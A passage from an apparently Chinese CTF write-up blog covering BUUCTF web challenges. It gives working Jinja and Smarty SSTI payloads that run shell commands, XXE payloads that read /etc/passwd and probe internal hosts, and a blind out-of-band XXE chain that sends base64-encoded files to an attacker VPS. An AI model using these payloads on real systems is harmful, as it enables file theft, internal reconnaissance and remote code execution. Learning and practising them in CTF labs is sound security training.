class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805174234.png" alt="image-20200805174234566"></p> <p>è¾“å…¥PINç ä¹‹åç”¨osæ¨¡å—ä¸ºæ‰€æ¬²ä¸º</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200805174402.png" alt="image-20200805174402883"></p> <h3 id="flasklight"><a href="#flasklight" class="header-anchor">#</a> flasklight</h3> <p>ç›´æ¥åˆ©ç”¨GitHubçš„<a href="https://github.com/F4ded/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection" target="_blank" rel="noopener noreferrer">è¿™ä¸ªé¡¹ç›®<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>ä¸­æ‰€ç»™çš„<code>subprocess.Popen.</code>è¿™ä¸ªæ¨¡å—çš„payloadæ¥æ‰“</p> <p>å¯»æ‰¾è¯¥æ¨¡å—çš„expï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree

url <span class="token operator">=</span> <span class="token string">'http://fb81170e-ce76-45d4-8d45-c1ff9ba2f3e1.node3.buuoj.cn/?search={{[].__class__.__base__.__subclasses__()}}'</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token comment"># Xpath:/html/body/h3[1]</span>
html <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
a <span class="token operator">=</span> html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">&quot;/html/body/h3[1]/text()&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

context <span class="token operator">=</span> a<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span>
count <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> context<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">&quot;subprocess.Popen&quot;</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>context<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>


<span class="token comment">#print(context)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>æœ€åpayloadï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">258</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">258</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flasklight/coomme_geeeett_youur_flek'</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="ciscn2019åä¸œå—èµ›åŒºweb11"><a href="#ciscn2019åä¸œå—èµ›åŒºweb11" class="header-anchor">#</a> CISCN2019åä¸œå—èµ›åŒºWeb11</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>Smarty SSTI</strong></li></ul> <div class="custom-block note"><p class="custom-block-title">ç¬”è®°</p> <p>Smartyæ˜¯ä¸€ä¸ªPHPçš„æ¨¡æ¿å¼•æ“ï¼Œæä¾›è®©ç¨‹åºé€»è¾‘ä¸é¡µé¢æ˜¾ç¤ºï¼ˆHTML/CSSï¼‰ä»£ç åˆ†ç¦»çš„åŠŸèƒ½ã€‚</p></div> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003205817.png" alt="image-20201003205810665"></p> <p>æ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œå¯ä»¥çŸ¥é“æ˜¯<code>Smarty</code>æ¨¡æ¿ï¼Œç»è¿‡ç®€å•çš„Googleä¹‹åå‘ç°è¿™ä¸ªæ¨¡æ¿å­˜åœ¨SSTIæ¼æ´ï¼Œä¼°è®¡è¿™ä¸ªé¢˜ç›®å°±æ˜¯è€ƒçš„è¿™ä¸€ç‚¹ã€‚</p> <p>é¡µé¢çš„å³ä¸Šè§’ä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„<code>IP</code>åœ°å€ï¼ŒçŒœæƒ³å¯ä»¥é€šè¿‡ä¿®æ”¹XFFå¤´æ¥é€ æˆSSTIï¼Œäºæ˜¯æˆ‘å°†XFFå¤´æ”¹æˆäº†<code>{1+1}</code>ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210249.png" alt="image-20201003210249780"></p> <p>ç¡®å®å­˜åœ¨XFFå¤´å¤„çš„SSTIï¼Œç„¶åç»è¿‡ç®€å•çš„æŸ¥è¯¢ä¹‹åï¼Œå‘ç°ä½¿ç”¨<code>{$smarty.version}</code>æ¥æ˜¾ç¤ºå½“å‰æ¨¡æ¿çš„ç‰ˆæœ¬ã€‚</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210356.png" alt="image-20201003210352836"></p> <p>ç„¶åå‘ç°Smartyçš„<code>{if xxx}{/if}</code>ç±»ä¼¼äºFlaskï¼Œå¯ä»¥æ‰§è¡ŒPHPä»£ç ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210743.png" alt="image-20201003210616454"></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token shell-comment comment"># payload</span>

<span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token punctuation">}</span>

<span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210924.png" alt="image-20201003210828917"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003210930.png" alt="image-20201003210853494"></p> <h2 id="xss"><a href="#xss" class="header-anchor">#</a> XSS</h2> <p>æš‚æ— </p> <h2 id="xxe"><a href="#xxe" class="header-anchor">#</a> XXE</h2> <h3 id="true-xml-cookbook"><a href="#true-xml-cookbook" class="header-anchor">#</a> True XML cookbook</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>XXEå†…ç½‘æ¢æµ‹</strong></li> <li><strong>Linuxå…³é”®æ–‡ä»¶ä½ç½®</strong></li></ul> <p>è¾“å…¥ç”¨æˆ·åå¯†ç ï¼ŒæŠ“åŒ…å‘ç°æ˜¯XMLæ ¼å¼çš„æ•°æ®ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726113603.png" alt="image-20200726112333098"></p> <p>å°è¯•ç”¨XXEè¯»å–æ•æ„Ÿæ–‡ä»¶ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726113607.png" alt="image-20200726112425979"></p> <p>è¯»å–æˆåŠŸï¼Œpayloadå¦‚ä¸‹ï¼š</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä½†æ˜¯ç»è¿‡å…¶ä»–å°è¯•ä¹‹åæ²¡æœ‰å‘ç°flagï¼Œæ¥ç€è¯»å–ä¸€ä¸‹/etc/hostsï¼Œå‘ç°ä¸€ä¸ªIPåœ°å€ï¼š<img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726113643.png" alt="image-20200726113642963"></p> <p>è¿™é‡Œå¾ˆå¯èƒ½æ˜¯è¦åšå†…ç½‘æ¢æµ‹äº†ï¼Œå…ˆå°è¯•ç”¨httpåè®®è®¿é—®ä¸€ä¸‹è¯¥ipåœ°å€ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726112922.png" alt="image-20200726112922755"></p> <p>æŠ¥é”™äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±çˆ†ç ´ä¸€ä¸‹å†…ç½‘çš„ä¸»æœºï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200726113056.png" alt="image-20200726113050786"></p> <p>é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒå‹å¥½ï¼Œåœ¨17126.2011è¿™å°ä¸»æœºä¸­å‘ç°äº†flagã€‚</p> <p>payload:</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM &quot;http://17126.2010&quot;&gt;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="suctf-2018-homework"><a href="#suctf-2018-homework" class="header-anchor">#</a> [SUCTF 2018]Homework</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>PHPåŸç”Ÿç±»<code>SimpleXMLElement</code>è¿›è¡ŒBlind XXE</strong></li> <li><strong>äºŒæ¬¡æ³¨å…¥</strong></li></ul> <h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="header-anchor">#</a> çŸ¥è¯†ç‚¹</h4> <p>PHPçš„åŸç”Ÿç±»<code>SimpleXMLElement</code>çš„<code>__construct</code>æ–¹æ³•å¯ä»¥ç”¨æ¥åŠ è½½ä¸€ä¸ªè¿œç¨‹çš„xmlæ–‡ä»¶ï¼š<a href="https://www.php.net/manual/zh/simplexmlelement.construct.php" target="_blank" rel="noopener noreferrer">å®˜æ–¹æ–‡æ¡£<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>æˆ‘è¿™é‡Œå°±æˆªå¼ å›¾ç®€å•çš„è¯´ä¸€ä¸‹ï¼š</p> <p><img src="https://i.loli.net/2020/11/16/CtISpThkgUlfGob.png" alt="image-20201116203313138"></p> <p>ä¸»è¦æ˜¯ç¬¬äºŒä¸ªå‚æ•°<code>options</code>ï¼Œå®˜æ–¹ä¸­é»˜è®¤ä½¿ç”¨äº†ä¸€äº›é¢„å®šä¹‰å¸¸é‡æ¥ä½œä¸ºå®ƒçš„å€¼ï¼Œå¦‚æœè¦è¿›è¡Œå¤–éƒ¨å®ä½“æ³¨å…¥çš„è¯ï¼Œè¿™é‡Œè¦å¡«çš„æ˜¯<code>LIBXML_NOENT</code>ï¼Œè¿™ä¸ªå‚æ•°å…è®¸è§£æå¤–éƒ¨å®ä½“ï¼ŒåŒæ ·ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ä¸­ä¹Ÿæç¤ºäº†å®ƒçš„å®‰å…¨é—®é¢˜ï¼š</p> <p><img src="https://i.loli.net/2020/11/16/4B1f7SOMuEs3nrq.png" alt="image-20201116203618811"></p> <h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="header-anchor">#</a> è§£é¢˜</h4> <p>è¿›å…¥ç¯å¢ƒç»™äº†ä¸€ä¸ªcalcçš„ç±»ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name">calc</span><span class="token punctuation">{</span>
	<span class="token keyword">function</span> <span class="token function">__construct__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token variable">$args1</span><span class="token punctuation">,</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$args2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$args1</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$args1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$args2</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$args2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">case</span> <span class="token single-quoted-string string">'a'</span><span class="token punctuation">:</span>
				<span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;+&quot;</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>

			<span class="token keyword">case</span> <span class="token single-quoted-string string">'b'</span><span class="token punctuation">:</span>
				<span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;-&quot;</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>

			<span class="token keyword">case</span> <span class="token single-quoted-string string">'c'</span><span class="token punctuation">:</span>
				<span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;*&quot;</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>

			<span class="token keyword">case</span> <span class="token single-quoted-string string">'d'</span><span class="token punctuation">:</span>
				<span class="token variable">$method</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;/&quot;</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			
			<span class="token keyword">default</span><span class="token punctuation">:</span>
				<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;invalid input&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token variable">$Expression</span><span class="token operator">=</span><span class="token variable">$args1</span><span class="token punctuation">.</span><span class="token variable">$method</span><span class="token punctuation">.</span><span class="token variable">$args2</span><span class="token punctuation">;</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;\$r=<span class="token interpolation"><span class="token variable">$Expression</span></span>;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Calculation results:&quot;</span><span class="token punctuation">.</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>		
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><p>ç‚¹å‡»CALCæŒ‰é’®ä¼šè¿”å›è®¡ç®—ç»“æœï¼ŒæŠ“åŒ…æŸ¥çœ‹ï¼š</p> <p><img src="https://i.loli.net/2020/11/16/BK3yvgFqUE5HRaT.png" alt="image-20201116203850149"></p> <p>ç»“åˆå®ƒç»™çš„æºç ï¼Œä¸éš¾çŒœæµ‹æ¯ä¸ªå‚æ•°çš„æ„ä¹‰ï¼š</p> <ul><li>moduleï¼šè°ƒç”¨çš„ç±»</li> <li>args[]ï¼šä¸€ä¸ªæ•°ç»„ï¼Œåˆ†åˆ«ä¸º$args1,$method,$args2</li></ul> <p>åœ¨<code>__construct</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>calc()</code>æ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥è§¦å‘è®¡ç®—ç»“æœçš„åŸå› å¾ˆå¯èƒ½æ˜¯newäº†ä¸€ä¸ª<code>calc</code>å¯¹è±¡ï¼Œè¿™æ ·å¯ä»¥è§¦å‘æ„é€ æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨<code>calc()</code>æ–¹æ³•ï¼Œä»è€Œè®¡ç®—äº†ç»“æœã€‚</p> <p>ç»“åˆä¹‹å‰æ‰€è¯´çš„<code>SimpleXMLElement#__construct</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿œç¨‹VPSæ„é€ ä¸€ä¸ªXMLæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªæ–¹æ³•è¿›è¡Œè¿œç¨‹åŠ è½½ï¼Œé€ æˆXXEï¼Œè¿œç¨‹VPSçš„XMLæ–‡ä»¶ï¼š</p> <p>test.xml</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">try</span><span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY % int SYSTEM &quot;http://{IP}/xxe/evil.xml&quot;&gt;
%int;
%all;
%send;
</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>evil.xml</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY <span class="token entity" title="&amp;#37;">&amp;#37;</span> send SYSTEM 'http://{IP}/xxe/test.php?file=%file;'&gt;&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>test.php</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code>&lt;?php
file_put_contents('1.txt',$_GET['file']);
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>åŠ è½½xmlæ–‡ä»¶ï¼š</p> <p><img src="https://i.loli.net/2020/11/16/Gx2OMYiLHnkRrE3.png" alt="image-20201116204647559"></p> <p>è¿™é‡Œæ³¨æ„<code>options</code>å‚æ•°ï¼Œæˆ‘ä»¬å¦‚æœç›´æ¥ä¼ é¢„å®šä¹‰çš„å¸¸é‡åçš„è¯ä¼šè¢«å½“æˆå­—ç¬¦ä¸²è§£æï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥ä¼ å…¥å¸¸é‡çš„å€¼ï¼ˆç»è¿‡æˆ‘çš„æµ‹è¯•16ä¹Ÿå¯ä»¥ï¼‰ï¼š</p> <p><img src="https://i.loli.net/2020/11/16/8tPE7xrildGWHVq.png" alt="image-20201116204829354"></p> <p>ç„¶ååˆ°VPSä¸Šæ”¶æ•°æ®ï¼š</p> <p><img src="https://i.loli.net/2020/11/16/hzqXiGAlSMONakW.png" alt="image-20201116205943243"></p> <p>æ¥ç€å°±å¯ä»¥æ‹¿æºç äº†ï¼Œè¿‡ç¨‹æˆ‘å°±ä¸å¤šè¯´äº†ï¼Œæˆ‘ç›´æ¥è¯´æ‹¿åˆ°æºç ä¹‹åçš„åˆ©ç”¨æ–¹å¼ï¼š</p> <p>function.php</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">function</span> <span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysql</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token variable">$result_array</span><span class="token operator">=</span><span class="token function">mysqli_fetch_all</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token variable">$result_array</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                 <span class="token keyword">echo</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token keyword">return</span> <span class="token double-quoted-string string">&quot;Failed&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;File is larger than 2M, forbidden upload&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;select * from file where filename='&quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
